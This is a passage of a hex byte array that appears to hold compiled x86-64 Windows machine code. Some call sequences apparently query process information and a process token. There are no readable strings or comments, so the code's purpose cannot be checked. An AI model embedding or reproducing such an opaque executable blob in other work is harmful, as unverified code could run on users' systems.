0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xA1, 0x3E, 0x00, 0x00, 0xE9,	0xB0, 0x33, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x8D, 0x05, 0xB9,	0x78, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,	0x48, 0x89, 0x4C, 0x24, 0x08, 0x48, 0x89, 0x54, 0x24, 0x10, 0x4C, 0x89,	0x44, 0x24, 0x18, 0x4C, 0x89, 0x4C, 0x24, 0x20, 0x53, 0x56, 0x57, 0x48,	0x83, 0xEC, 0x30, 0x48, 0x8B, 0xF9, 0x48, 0x8D, 0x74, 0x24, 0x58, 0xB9,	0x01, 0x00, 0x00, 0x00, 0xFF, 0x15, 0xCA, 0x42, 0x00, 0x00, 0x48, 0x8B,	0xD8, 0xE8, 0xBA, 0xFF, 0xFF, 0xFF, 0x45, 0x33, 0xC9, 0x48, 0x89, 0x74,	0x24, 0x20, 0x4C, 0x8B, 0xC7, 0x48, 0x8B, 0xD3, 0x48, 0x8B, 0x08, 0xFF,	0x15, 0x4B, 0x42, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x30, 0x5F, 0x5E, 0x5B,	0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,	0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xD9, 0x48, 0x8B, 0xC2,	0x48, 0x8D, 0x0D, 0x65, 0x43, 0x00, 0x00, 0x0F, 0x57, 0xC0, 0x48, 0x8D,	0x53, 0x08, 0x48, 0x89, 0x0B, 0x48, 0x8D, 0x48, 0x08, 0x0F, 0x11, 0x02,	0xFF, 0x15, 0x2E, 0x41, 0x00, 0x00, 0x48, 0x8B, 0xC3, 0x48, 0x83, 0xC4,	0x20, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x8B, 0x51, 0x08, 0x48, 0x8D, 0x05, 0x7D,	0x43, 0x00, 0x00, 0x48, 0x85, 0xD2, 0x48, 0x0F, 0x45, 0xC2, 0xC3, 0xCC,	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,	0x48, 0x89, 0x5C, 0x24, 0x08, 0x57, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8D,	0x05, 0x07, 0x43, 0x00, 0x00, 0x48, 0x8B, 0xF9, 0x48, 0x89, 0x01, 0x8B,	0xDA, 0x48, 0x83, 0xC1, 0x08, 0xFF, 0x15, 0xCD, 0x40, 0x00, 0x00, 0xF6,	0xC3, 0x01, 0x74, 0x0D, 0xBA, 0x18, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xCF,	0xE8, 0x6F, 0x2B, 0x00, 0x00, 0x48, 0x8B, 0x5C, 0x24, 0x30, 0x48, 0x8B,	0xC7, 0x48, 0x83, 0xC4, 0x20, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,	0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x8D, 0x05, 0xC1,	0x42, 0x00, 0x00, 0x48, 0x89, 0x01, 0x48, 0x83, 0xC1, 0x08, 0x48, 0xFF,	0x25, 0x8B, 0x40, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x8D, 0x05, 0x09, 0x43, 0x00, 0x00, 0x48,	0xC7, 0x41, 0x10, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0x41, 0x08, 0x48,	0x8D, 0x05, 0xCE, 0x42, 0x00, 0x00, 0x48, 0x89, 0x01, 0x48, 0x8B, 0xC1,	0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x48, 0x48, 0x8D, 0x4C, 0x24,	0x20, 0xE8, 0xC2, 0xFF, 0xFF, 0xFF, 0x48, 0x8D, 0x15, 0x6B, 0x58, 0x00,	0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0xE8, 0x93, 0x38, 0x00, 0x00, 0xCC,	0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xD9, 0x48, 0x8B, 0xC2,	0x48, 0x8D, 0x0D, 0x45, 0x42, 0x00, 0x00, 0x0F, 0x57, 0xC0, 0x48, 0x8D,	0x53, 0x08, 0x48, 0x89, 0x0B, 0x48, 0x8D, 0x48, 0x08, 0x0F, 0x11, 0x02,	0xFF, 0x15, 0x0E, 0x40, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x67, 0x42, 0x00,	0x00, 0x48, 0x89, 0x03, 0x48, 0x8B, 0xC3, 0x48, 0x83, 0xC4, 0x20, 0x5B,	0xC3, 0xCC, 0xCC, 0xCC, 0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B,	0xD9, 0x48, 0x8B, 0xC2, 0x48, 0x8D, 0x0D, 0x05, 0x42, 0x00, 0x00, 0x0F,	0x57, 0xC0, 0x48, 0x8D, 0x53, 0x08, 0x48, 0x89, 0x0B, 0x48, 0x8D, 0x48,	0x08, 0x0F, 0x11, 0x02, 0xFF, 0x15, 0xCE, 0x3F, 0x00, 0x00, 0x48, 0x8D,	0x05, 0xFF, 0x41, 0x00, 0x00, 0x48, 0x89, 0x03, 0x48, 0x8B, 0xC3, 0x48,	0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28,	0x48, 0x8D, 0x0D, 0x4D, 0x42, 0x00, 0x00, 0xFF, 0x15, 0x2F, 0x3F, 0x00,	0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x8D, 0x05, 0x49, 0x42, 0x00, 0x00, 0x48,	0xC7, 0x41, 0x10, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0x41, 0x08, 0x48,	0x8D, 0x05, 0xD6, 0x43, 0x00, 0x00, 0x48, 0x89, 0x01, 0x48, 0x8B, 0xC1,	0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,	0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x48, 0x48, 0x8D, 0x4C, 0x24,	0x20, 0xE8, 0xC2, 0xFF, 0xFF, 0xFF, 0x48, 0x8D, 0x15, 0xC3, 0x56, 0x00,	0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0xE8, 0xA3, 0x37, 0x00, 0x00, 0xCC,	0x40, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xD9, 0x48, 0x8B, 0xC2,	0x48, 0x8D, 0x0D, 0x55, 0x41, 0x00, 0x00, 0x0F, 0x57, 0xC0, 0x48, 0x8D,	0x53, 0x08, 0x48, 0x89, 0x0B, 0x48, 0x8D, 0x48, 0x08, 0x0F, 0x11, 0x02,	0xFF, 0x15, 0x1E, 0x3F, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x6F, 0x43, 0x00,	0x00, 0x48, 0x89, 0x03, 0x48, 0x8B, 0xC3, 0x48, 0x83, 0xC4, 0x20, 0x5B,	0xC3, 0xCC, 0xCC, 0xCC, 0x48, 0x83, 0xEC, 0x28, 0x48, 0x8B, 0x49, 0x08,	0x48, 0x85, 0xC9, 0x74, 0x1D, 0x48, 0x8B, 0x01, 0xFF, 0x50, 0x10, 0x48,	0x85, 0xC0, 0x74, 0x12, 0x4C, 0x8B, 0x00, 0xBA, 0x01, 0x00, 0x00, 0x00,	0x48, 0x8B, 0xC8, 0x48, 0x83, 0xC4, 0x28, 0x49, 0xFF, 0x20, 0x48, 0x83,	0xC4, 0x28, 0xC3, 0xCC, 0x48, 0x89, 0x5C, 0x24, 0x08, 0x48, 0x89, 0x74,	0x24, 0x10, 0x48, 0x89, 0x7C, 0x24, 0x18, 0x4C, 0x89, 0x74, 0x24, 0x20,	0x55, 0x48, 0x8D, 0xAC, 0x24, 0x50, 0xF8, 0xFF, 0xFF, 0x48, 0x81, 0xEC,	0xB0, 0x08, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xE5, 0x6C, 0x00, 0x00, 0x48,	0x33, 0xC4, 0x48, 0x89, 0x85, 0xA0, 0x07, 0x00, 0x00, 0x45, 0x33, 0xF6,	0x44, 0x89, 0x75, 0xA0, 0xFF, 0x15, 0xFE, 0x3C, 0x00, 0x00, 0x8B, 0xD8,	0x33, 0xD2, 0x41, 0xB8, 0x08, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0x10,	0xE8, 0xE9, 0x36, 0x00, 0x00, 0x48, 0x8D, 0x05, 0x34, 0x42, 0x00, 0x00,	0x48, 0x89, 0x45, 0x10, 0x48, 0x8D, 0x8D, 0xB8, 0x00, 0x00, 0x00, 0xFF,	0x15, 0xA3, 0x3D, 0x00, 0x00, 0x90, 0xC7, 0x45, 0xA0, 0x01, 0x00, 0x00,	0x00, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0x48, 0x8D, 0x55, 0x18, 0x48,	0x8D, 0x4D, 0x10, 0xFF, 0x15, 0x8F, 0x3D, 0x00, 0x00, 0x90, 0x48, 0x8B,	0x45, 0x10, 0x48, 0x63, 0x48, 0x04, 0x48, 0x8D, 0x05, 0x07, 0x42, 0x00,	0x00, 0x48, 0x89, 0x44, 0x0D, 0x10, 0x48, 0x8B, 0x45, 0x10, 0x48, 0x63,	0x48, 0x04, 0x8D, 0x91, 0x58, 0xFF, 0xFF, 0xFF, 0x89, 0x54, 0x0D, 0x0C,	0x48, 0x8D, 0x45, 0x18, 0x48, 0x89, 0x45, 0x80, 0x48, 0x8D, 0x4D, 0x18,	0xFF, 0x15, 0x0E, 0x3D, 0x00, 0x00, 0x90, 0x48, 0x8D, 0x05, 0xE6, 0x41,	0x00, 0x00, 0x48, 0x89, 0x45, 0x18, 0x44, 0x88, 0xB5, 0x94, 0x00, 0x00,	0x00, 0x44, 0x88, 0xB5, 0x89, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0x18,	0xFF, 0x15, 0xF2, 0x3C, 0x00, 0x00, 0x4C, 0x89, 0xB5, 0x98, 0x00, 0x00,	0x00, 0x48, 0x8B, 0x05, 0x1C, 0x76, 0x00, 0x00, 0x48, 0x89, 0x85, 0x8C,	0x00, 0x00, 0x00, 0x4C, 0x89, 0xB5, 0x80, 0x00, 0x00, 0x00, 0x4C, 0x89,	0x75, 0xB8, 0x48, 0xC7, 0x45, 0xC0, 0x0F, 0x00, 0x00, 0x00, 0x44, 0x88,	0x75, 0xA8, 0x4C, 0x89, 0x75, 0xF8, 0x48, 0xC7, 0x45, 0x00, 0x0F, 0x00,	0x00, 0x00, 0x44, 0x88, 0x75, 0xE8, 0x45, 0x8D, 0x46, 0x11, 0x48, 0x8D,	0x15, 0xAB, 0x40, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xE8, 0xE8, 0x7A, 0x1B,	0x00, 0x00, 0x90, 0x4C, 0x89, 0x75, 0xD8, 0x48, 0xC7, 0x45, 0xE0, 0x0F,	0x00, 0x00, 0x00, 0x44, 0x88, 0x75, 0xC8, 0x45, 0x8D, 0x46, 0x04, 0x48,	0x8D, 0x15, 0x9A, 0x40, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0xC8, 0xE8, 0x55,	0x1B, 0x00, 0x00, 0x90, 0x4C, 0x8D, 0x8D, 0x35, 0x01, 0x00, 0x00, 0x44,	0x8B, 0xC3, 0x66, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,	0x49, 0xFF, 0xC9, 0xB8, 0xCD, 0xCC, 0xCC, 0xCC, 0x41, 0xF7, 0xE0, 0xC1,	0xEA, 0x03, 0x0F, 0xB6, 0xC2, 0xC0, 0xE0, 0x02, 0x8D, 0x0C, 0x10, 0x02,	0xC9, 0x44, 0x2A, 0xC1, 0x41, 0x80, 0xC0, 0x30, 0x45, 0x88, 0x01, 0x44,	0x8B, 0xC2, 0x85, 0xD2, 0x75, 0xD6, 0x4C, 0x89, 0x74, 0x24, 0x70, 0x48,	0xC7, 0x44, 0x24, 0x78, 0x0F, 0x00, 0x00, 0x00, 0x88, 0x54, 0x24, 0x60,	0x48, 0x8D, 0x85, 0x35, 0x01, 0x00, 0x00, 0x4C, 0x3B, 0xC8, 0x74, 0x18,	0x4C, 0x8D, 0x85, 0x35, 0x01, 0x00, 0x00, 0x4D, 0x2B, 0xC1, 0x49, 0x8B,	0xD1, 0x48, 0x8D, 0x4C, 0x24, 0x60, 0xE8, 0xE1, 0x1A, 0x00, 0x00, 0x90,	0x4C, 0x8D, 0x45, 0xE8, 0x48, 0x83, 0x7D, 0x00, 0x10, 0x4C, 0x0F, 0x43,	0x45, 0xE8, 0x4C, 0x8B, 0x4D, 0xF8, 0x48, 0x8D, 0x4C, 0x24, 0x60, 0xE8,	0xE4, 0x22, 0x00, 0x00, 0x4C, 0x89, 0x74, 0x24, 0x50, 0x4C, 0x89, 0x74,	0x24, 0x58, 0x0F, 0x10, 0x00, 0x0F, 0x11, 0x44, 0x24, 0x40, 0x0F, 0x10,	0x48, 0x10, 0x0F, 0x11, 0x4C, 0x24, 0x50, 0x4C, 0x89, 0x70, 0x10, 0x48,	0xC7, 0x40, 0x18, 0x0F, 0x00, 0x00, 0x00, 0xC6, 0x00, 0x00, 0x48, 0x8D,	0x55, 0xC8, 0x48, 0x83, 0x7D, 0xE0, 0x10, 0x48, 0x0F, 0x43, 0x55, 0xC8,	0x4C, 0x8B, 0x45, 0xD8, 0x48, 0x8D, 0x4C, 0x24, 0x40, 0xE8, 0xDE, 0x1B,	0x00, 0x00, 0x0F, 0x10, 0x00, 0x0F, 0x11, 0x45, 0x80, 0x0F, 0x10, 0x48,	0x10, 0x0F, 0x11, 0x8D, 0x20, 0x01, 0x00, 0x00, 0x4C, 0x89, 0x70, 0x10,	0x48, 0xC7, 0x40, 0x18, 0x0F, 0x00, 0x00, 0x00, 0xC6, 0x00, 0x00, 0x48,	0x8B, 0x55, 0xC0, 0x48, 0x83, 0xFA, 0x10, 0x72, 0x3F, 0x48, 0xFF, 0xC2,	0x48, 0x8B, 0x4D, 0xA8, 0x48, 0x8B, 0xC1, 0x48, 0x81, 0xFA, 0x00, 0x10,	0x00, 0x00, 0x72, 0x1C, 0x48, 0x83, 0xC2, 0x27, 0x48, 0x8B, 0x49, 0xF8,	0x48, 0x2B, 0xC1, 0x48, 0x83, 0xC0, 0xF8, 0x48, 0x83, 0xF8, 0x1F, 0x76,	0x07, 0xFF, 0x15, 0x0D, 0x3D, 0x00, 0x00, 0xCC, 0xE8, 0xF3, 0x26, 0x00,	0x00, 0x0F, 0x10, 0x45, 0x80, 0x0F, 0x10, 0x8D, 0x20, 0x01, 0x00, 0x00,	0x0F, 0x11, 0x45, 0xA8, 0x0F, 0x11, 0x4D, 0xB8, 0x48, 0x8B, 0x54, 0x24,	0x58, 0x48, 0x83, 0xFA, 0x10, 0x72, 0x35, 0x48, 0xFF, 0xC2, 0x48, 0x8B,	0x4C, 0x24, 0x40, 0x48, 0x8B, 0xC1, 0x48, 0x81, 0xFA, 0x00, 0x10, 0x00,	0x00, 0x72, 0x1C, 0x48, 0x83, 0xC2, 0x27, 0x48, 0x8B, 0x49, 0xF8, 0x48,	0x2B, 0xC1, 0x48, 0x83, 0xC0, 0xF8, 0x48, 0x83, 0xF8, 0x1F, 0x76, 0x07,	0xFF, 0x15, 0xBA, 0x3C, 0x00, 0x00, 0xCC, 0xE8, 0xA0, 0x26, 0x00, 0x00,	0x4C, 0x89, 0x74, 0x24, 0x50, 0x48, 0xC7, 0x44, 0x24, 0x58, 0x0F, 0x00,	0x00, 0x00, 0xC6, 0x44, 0x24, 0x40, 0x00, 0x48, 0x8B, 0x54, 0x24, 0x78,	0x48, 0x83, 0xFA, 0x10, 0x72, 0x35, 0x48, 0xFF, 0xC2, 0x48, 0x8B, 0x4C,	0x24, 0x60, 0x48, 0x8B, 0xC1, 0x48, 0x81, 0xFA, 0x00, 0x10, 0x00, 0x00,	0x72, 0x1C, 0x48, 0x83, 0xC2, 0x27, 0x48, 0x8B, 0x49, 0xF8, 0x48, 0x2B,	0xC1, 0x48, 0x83, 0xC0, 0xF8, 0x48, 0x83, 0xF8, 0x1F, 0x76, 0x07, 0xFF,	0x15, 0x67, 0x3C, 0x00, 0x00, 0xCC, 0xE8, 0x4D, 0x26, 0x00, 0x00, 0x48,	0x8D, 0x55, 0xA8, 0x48, 0x8D, 0x4D, 0x10, 0xE8, 0x3C, 0x15, 0x00, 0x00,	0x90, 0x4C, 0x89, 0x74, 0x24, 0x70, 0x48, 0xC7, 0x44, 0x24, 0x78, 0x0F,	0x00, 0x00, 0x00, 0xC6, 0x44, 0x24, 0x60, 0x00, 0xC7, 0x45, 0xA0, 0x3F,	0x00, 0x00, 0x00, 0x44, 0x8B, 0xC3, 0x33, 0xD2, 0xB9, 0x00, 0x10, 0x00,	0x00, 0xFF, 0x15, 0xE1, 0x39, 0x00, 0x00, 0x48, 0x8B, 0xF0, 0x48, 0xC7,	0xC7, 0xFF, 0xFF, 0xFF, 0xFF, 0x48, 0x85, 0xC0, 0x74, 0x77, 0xC7, 0x45,	0xA4, 0x00, 0x04, 0x00, 0x00, 0x4C, 0x8D, 0x4D, 0xA4, 0x4C, 0x8D, 0x85,	0xA0, 0x03, 0x00, 0x00, 0x33, 0xD2, 0x48, 0x8B, 0xC8, 0xFF, 0x15, 0x9D,	0x39, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x37, 0x48, 0x8D, 0x85, 0xA0, 0x03,	0x00, 0x00, 0x4C, 0x8B, 0xC7, 0x0F, 0x1F, 0x80, 0x00, 0x00, 0x00, 0x00,	0x49, 0xFF, 0xC0, 0x42, 0x80, 0x3C, 0x00, 0x00, 0x75, 0xF6, 0x48, 0x8D,	0x95, 0xA0, 0x03, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x60, 0xE8, 0xE5,	0x18, 0x00, 0x00, 0x48, 0x8B, 0xCE, 0xFF, 0x15, 0x4C, 0x39, 0x00, 0x00,	0xEB, 0x33, 0xFF, 0x15, 0x54, 0x39, 0x00, 0x00, 0x8B, 0xD0, 0x48, 0x8D,	0x0D, 0xBB, 0x3D, 0x00, 0x00, 0xE8, 0x36, 0xF9, 0xFF, 0xFF, 0x48, 0x8B,	0xCE, 0xFF, 0x15, 0x2D, 0x39, 0x00, 0x00, 0xEB, 0x14, 0xFF, 0x15, 0x35,	0x39, 0x00, 0x00, 0x8B, 0xD0, 0x48, 0x8D, 0x0D, 0xBC, 0x3D, 0x00, 0x00,	0xE8, 0x17, 0xF9, 0xFF, 0xFF, 0x41, 0xB9, 0x09, 0x00, 0x00, 0x00, 0x4C,	0x8D, 0x05, 0xE2, 0x3D, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x60, 0xE8,	0xB0, 0x20, 0x00, 0x00, 0x4C, 0x89, 0x74, 0x24, 0x50, 0x4C, 0x89, 0x74,	0x24, 0x58, 0x0F, 0x10, 0x00, 0x0F, 0x11, 0x44, 0x24, 0x40, 0x0F, 0x10,	0x48, 0x10, 0x0F, 0x11, 0x4C, 0x24, 0x50, 0x4C, 0x89, 0x70, 0x10, 0x48,	0xC7, 0x40, 0x18, 0x0F, 0x00, 0x00, 0x00, 0xC6, 0x00, 0x00, 0xC7, 0x45,	0xA0, 0x7F, 0x00, 0x00, 0x00, 0x41, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48,	0x8D, 0x15, 0x96, 0x3D, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x40, 0xE8,	0xA8, 0x19, 0x00, 0x00, 0x4C, 0x89, 0xB5, 0x30, 0x01, 0x00, 0x00, 0x4C,	0x89, 0xB5, 0x38, 0x01, 0x00, 0x00, 0x0F, 0x10, 0x00, 0x0F, 0x11, 0x85,	0x20, 0x01, 0x00, 0x00, 0x0F, 0x10, 0x48, 0x10, 0x0F, 0x11, 0x8D, 0x30,	0x01, 0x00, 0x00, 0x4C, 0x89, 0x70, 0x10, 0x48, 0xC7, 0x40, 0x18, 0x0F,	0x00, 0x00, 0x00, 0xC6, 0x00, 0x00, 0xC7, 0x45, 0xA0, 0xFF, 0x00, 0x00,	0x00, 0x48, 0x8D, 0x95, 0x20, 0x01, 0x00, 0x00, 0x48, 0x83, 0xBD, 0x38,	0x01, 0x00, 0x00, 0x10, 0x48, 0x0F, 0x43, 0x95, 0x20, 0x01, 0x00, 0x00,	0x4C, 0x8B, 0x85, 0x30, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x4D, 0x10, 0xE8,	0xF8, 0x20, 0x00, 0x00, 0x90, 0x48, 0x8B, 0x95, 0x38, 0x01, 0x00, 0x00,	0x48, 0x83, 0xFA, 0x10, 0x72, 0x37, 0x48, 0xFF, 0xC2, 0x48, 0x8B, 0x8D,	0x20, 0x01, 0x00, 0x00, 0x48, 0x8B, 0xC1, 0x48, 0x81, 0xFA, 0x00, 0x10,	0x00, 0x00, 0x72, 0x1C, 0x48, 0x83, 0xC2, 0x27, 0x48, 0x8B, 0x49, 0xF8,	0x48, 0x2B, 0xC1, 0x48, 0x83, 0xC0, 0xF8, 0x48, 0x83, 0xF8, 0x1F, 0x76,	0x07, 0xFF, 0x15, 0x91, 0x3A, 0x00, 0x00, 0xCC, 0xE8, 0x77, 0x24, 0x00,	0x00, 0x4C, 0x89, 0xB5, 0x30, 0x01, 0x00, 0x00, 0x48, 0xC7, 0x85, 0x38,	0x01, 0x00, 0x00, 0x0F, 0x00, 0x00, 0x00, 0xC6, 0x85, 0x20, 0x01, 0x00,	0x00, 0x00, 0x48, 0x8B, 0x54, 0x24, 0x58, 0x48, 0x83, 0xFA, 0x10, 0x72,	0x35, 0x48, 0xFF, 0xC2, 0x48, 0x8B, 0x4C, 0x24, 0x40, 0x48, 0x8B, 0xC1,	0x48, 0x81, 0xFA, 0x00, 0x10, 0x00, 0x00, 0x72, 0x1C, 0x48, 0x83, 0xC2,	0x27, 0x48, 0x8B, 0x49, 0xF8, 0x48, 0x2B, 0xC1, 0x48, 0x83, 0xC0, 0xF8,	0x48, 0x83, 0xF8, 0x1F, 0x76, 0x07, 0xFF, 0x15, 0x38, 0x3A, 0x00, 0x00,	0xCC, 0xE8, 0x1E, 0x24, 0x00, 0x00, 0x4C, 0x89, 0x74, 0x24, 0x50, 0x48,	0xC7, 0x44, 0x24, 0x58, 0x0F, 0x00, 0x00, 0x00, 0xC6, 0x44, 0x24, 0x40,	0x00, 0x48, 0x8B, 0x54, 0x24, 0x78, 0x48, 0x83, 0xFA, 0x10, 0x72, 0x35,	0x48, 0xFF, 0xC2, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x48, 0x8B, 0xC1, 0x48,	0x81, 0xFA, 0x00, 0x10, 0x00, 0x00, 0x72, 0x1C, 0x48, 0x83, 0xC2, 0x27,	0x48, 0x8B, 0x49, 0xF8, 0x48, 0x2B, 0xC1, 0x48, 0x83, 0xC0, 0xF8, 0x48,	0x83, 0xF8, 0x1F, 0x76, 0x07, 0xFF, 0x15, 0xE5, 0x39, 0x00, 0x00, 0xCC,	0xE8, 0xCB, 0x23, 0x00, 0x00, 0x4C, 0x8D, 0x8D, 0x35, 0x01, 0x00, 0x00,	0x49, 0xFF, 0xC9, 0xB8, 0xCD, 0xCC, 0xCC, 0xCC, 0xF7, 0xE3, 0xC1, 0xEA,	0x03, 0x0F, 0xB6, 0xC2, 0xC0, 0xE0, 0x02, 0x8D, 0x0C, 0x10, 0x02, 0xC9,	0x2A, 0xD9, 0x80, 0xC3, 0x30, 0x41, 0x88, 0x19, 0x8B, 0xDA, 0x85, 0xD2,	0x75, 0xDA, 0x4C, 0x89, 0x74, 0x24, 0x70, 0x48, 0xC7, 0x44, 0x24, 0x78,	0x0F, 0x00, 0x00, 0x00, 0x88, 0x54, 0x24, 0x60, 0x48, 0x8D, 0x85, 0x35,	0x01, 0x00, 0x00, 0x4C, 0x3B, 0xC8, 0x74, 0x18, 0x4C, 0x8D, 0x85, 0x35,	0x01, 0x00, 0x00, 0x4D, 0x2B, 0xC1, 0x49, 0x8B, 0xD1, 0x48, 0x8D, 0x4C,	0x24, 0x60, 0xE8, 0x95, 0x16, 0x00, 0x00, 0x90, 0x41, 0xB9, 0x05, 0x00,	0x00, 0x00, 0x4C, 0x8D, 0x05, 0xDB, 0x3B, 0x00, 0x00, 0x48, 0x8D, 0x4C,	0x24, 0x60, 0xE8, 0x9D, 0x1E, 0x00, 0x00, 0x4C, 0x89, 0x74, 0x24, 0x50,	0x4C, 0x89, 0x74, 0x24, 0x58, 0x0F, 0x10, 0x00, 0x0F, 0x11, 0x44, 0x24,	0x40, 0x0F, 0x10, 0x48, 0x10, 0x0F, 0x11, 0x4C, 0x24, 0x50, 0x4C, 0x89,	0x70, 0x10, 0x48, 0xC7, 0x40, 0x18, 0x0F, 0x00, 0x00, 0x00, 0xC6, 0x00,	0x00, 0x41, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x8A, 0x3B,	0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x40, 0xE8, 0x9C, 0x17, 0x00, 0x00,	0x4C, 0x89, 0x75, 0x90, 0x4C, 0x89, 0x75, 0x98, 0x0F, 0x10, 0x00, 0x0F,	0x11, 0x45, 0x80, 0x0F, 0x10, 0x48, 0x10, 0x0F, 0x11, 0x4D, 0x90, 0x4C,	0x89, 0x70, 0x10, 0x48, 0xC7, 0x40, 0x18, 0x0F, 0x00, 0x00, 0x00, 0xC6,	0x00, 0x00, 0x48, 0x8D, 0x55, 0x80, 0x48, 0x83, 0x7D, 0x98, 0x10, 0x48,	0x0F, 0x43, 0x55, 0x80, 0x4C, 0x8B, 0x45, 0x90, 0x48, 0x8D, 0x4D, 0x10,	0xE8, 0x0B, 0x1F, 0x00, 0x00, 0x90, 0x48, 0x8B, 0x55, 0x98, 0x48, 0x83,	0xFA, 0x10, 0x72, 0x34, 0x48, 0xFF, 0xC2, 0x48, 0x8B, 0x4D, 0x80, 0x48,	0x8B, 0xC1, 0x48, 0x81, 0xFA, 0x00, 0x10, 0x00, 0x00, 0x72, 0x1C, 0x48,	0x83, 0xC2, 0x27, 0x48, 0x8B, 0x49, 0xF8, 0x48, 0x2B, 0xC1, 0x48, 0x83,	0xC0, 0xF8, 0x48, 0x83, 0xF8, 0x1F, 0x76, 0x07, 0xFF, 0x15, 0xAA, 0x38,	0x00, 0x00, 0xCC, 0xE8, 0x90, 0x22, 0x00, 0x00, 0x4C, 0x89, 0x75, 0x90,	0x48, 0xC7, 0x45, 0x98, 0x0F, 0x00, 0x00, 0x00, 0xC6, 0x45, 0x80, 0x00,	0x48, 0x8B, 0x54, 0x24, 0x58, 0x48, 0x83, 0xFA, 0x10, 0x72, 0x35, 0x48,	0xFF, 0xC2, 0x48, 0x8B, 0x4C, 0x24, 0x40, 0x48, 0x8B, 0xC1, 0x48, 0x81,	0xFA, 0x00, 0x10, 0x00, 0x00, 0x72, 0x1C, 0x48, 0x83, 0xC2, 0x27, 0x48,	0x8B, 0x49, 0xF8, 0x48, 0x2B, 0xC1, 0x48, 0x83, 0xC0, 0xF8, 0x48, 0x83,	0xF8, 0x1F, 0x76, 0x07, 0xFF, 0x15, 0x5A, 0x38, 0x00, 0x00, 0xCC, 0xE8,	0x40, 0x22, 0x00, 0x00, 0x4C, 0x89, 0x74, 0x24, 0x50, 0x48, 0xC7, 0x44,	0x24, 0x58, 0x0F, 0x00, 0x00, 0x00, 0xC6, 0x44, 0x24, 0x40, 0x00, 0x48,	0x8B, 0x54, 0x24, 0x78, 0x48, 0x83, 0xFA, 0x10, 0x72, 0x35, 0x48, 0xFF,	0xC2, 0x48, 0x8B, 0x4C, 0x24, 0x60, 0x48, 0x8B, 0xC1, 0x48, 0x81, 0xFA,	0x00, 0x10, 0x00, 0x00, 0x72, 0x1C, 0x48, 0x83, 0xC2, 0x27, 0x48, 0x8B,	0x49, 0xF8, 0x48, 0x2B, 0xC1, 0x48, 0x83, 0xC0, 0xF8, 0x48, 0x83, 0xF8,	0x1F, 0x76, 0x07, 0xFF, 0x15, 0x07, 0x38, 0x00, 0x00, 0xCC, 0xE8, 0xED,	0x21, 0x00, 0x00, 0x4C, 0x89, 0x75, 0x80, 0xFF, 0x15, 0xA7, 0x35, 0x00,	0x00, 0xFF, 0x15, 0xA1, 0x35, 0x00, 0x00, 0x48, 0x8B, 0xC8, 0x4C, 0x8D,	0x45, 0x80, 0xBA, 0x08, 0x00, 0x00, 